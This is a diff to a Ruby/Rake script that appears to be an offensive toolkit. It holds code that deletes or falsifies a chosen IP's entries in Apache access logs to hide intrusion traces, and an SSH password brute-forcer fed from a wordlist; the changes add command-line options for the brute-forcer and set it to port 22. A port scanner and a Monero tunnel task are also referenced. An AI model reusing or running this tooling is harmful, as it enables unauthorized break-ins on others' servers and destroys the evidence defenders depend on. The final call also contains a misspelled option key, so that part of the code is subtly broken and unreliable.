@@ -40,7 +40,6 @@ class Apache2
     def initialize(rip: nil, path: "/.env", meth: "GET", remove: nil, live: true, apache_log: "/var/log/apache2/access.log", tmp_log: "/var/log/apache2/.access.log")
         # replace IP
         @rip  = rip
-
         @path = path
         @meth = meth
         @live = live
@@ -71,36 +70,36 @@ class Apache2
         @path = pp
     end
     def file_write(text)
-        if @live
-            if File.exists?(@apache_log)
-                File.open(@apache_log, 'a') { |file| file.write(text) }
-            end
-        else
-            File.open("access-n.log", 'a') { |file| file.write(text) }
-        end
+      if @live
+          if File.exists?(@apache_log)
+            File.open(@apache_log, 'a') { |file| file.write(text) }
+          end
+      else
+        File.open("access-n.log", 'a') { |file| file.write(text) }
+      end
     end
     def remove
-        log.each do |l|
-            ip = l.split(" ")[0]
-            if ip.to_s != @rip
-                file_write(l)
-            end
+      log.each do |l|
+        ip = l.split(" ")[0]
+        if ip.to_s != @rip
+            file_write(l)
         end
+      end
     cleanup
     end
     def replace
-        log.each do |l|
-            ip = l.split(" ")[0]
-            if ip.to_s == @rip
-                line    = l.split
-                line[6] = @path
-                line[0] = IPAddr.new(rand(2**32),Socket::AF_INET).to_s
-                line[5] = '"' + @meth
-                file_write(line.join(" "))
-            else
-                file_write(l)
-            end
-        end
+      log.each do |l|
+          ip = l.split(" ")[0]
+          if ip.to_s == @rip
+              line    = l.split
+              line[6] = @path
+              line[0] = IPAddr.new(rand(2**32),Socket::AF_INET).to_s
+              line[5] = '"' + @meth
+              file_write(line.join(" "))
+          else
+              file_write(l)
+          end
+      end
     cleanup
     end
 end
@@ -120,7 +119,7 @@ class Brute
   end
   def ssh(l)
     begin
-      Net::SSH.start(@host, l.split(":")[0], :password => l.split(":")[1], :timeout => 10, :port => 33, :number_of_password_prompts => 0) do |ssh|
+      Net::SSH.start(@host, l.split(":")[0], :password => l.split(":")[1], :timeout => 10, :port => 22, :number_of_password_prompts => 0) do |ssh|
         puts ssh.exec!("hostname")
         return true
       end
@@ -149,7 +148,6 @@ def port_scan(host, port)
       s.close
     end
   rescue Errno::ENETUNREACH, Errno::ECONNREFUSED, Timeout::Error
-    #puts "[!] #{host} | Port #{port} timeout/filtered"
   end
 end
 desc "Monero rpc tunnel"
@@ -216,7 +214,10 @@ task :sshbrute [:ip, :found_file, :wl] do |t, args|
   args.with_defaults(:found_file => "found.txt", :wl => "brute.txt")
   b = Brute.new(host: args.ip, word_list: args.wl, found_file: args.found_file).run
 end
-options = {}
+options = {
+  "wl": "brute.txt",
+  "ffile": "found.txt"
+}
 OptionParser.new do |parser|
   parser.on("--clean", "Remove any .txt files in the current directory.") do |a|
     options[:clean] = true
@@ -260,11 +261,17 @@ OptionParser.new do |parser|
   parser.on("--rmip [RMIP]", "Remove IP from Apache2 logs") do |b|
     options[:rmip] = b
   end
-  parser.on("--rmip [RMIP]", "Remove IP from Apache2 logs") do |b|
-    options[:rmip] = b
-  end
   parser.on("--replaceip [REPLACEIP]", "Replace IP in apache2 logs with a fake IP") do |b|
     options[:replaceip] = b
+  end
+  parser.on("--sshbrute [SSHBRUTE]", "BruteForce SSH server") do |b|
+    options[:sshbrute] = b
+  end
+  parser.on("--wl [WL]", "Wordlist -- used by sshbrute for login wordlist") do |b|
+    options[:wl] = b
+  end
+  parser.on("--ffile [FFILE]", "Where valid logins are stored.") do |b|
+    options[:ffile] = b
   end
 end.parse!
 if options[:clean]
@@ -304,4 +311,7 @@ if !options[:rmip].nil?
 end
 if !options[:replaceip].nil?
   Rake::Task['replaceip'].invoke(options[:replaceip])
+end
+if !options[:sshbrute].nil?
+  Rake::Task['sshbrute'].invoke(options[:sshrute], options[:ffile], options[:wl])
 end
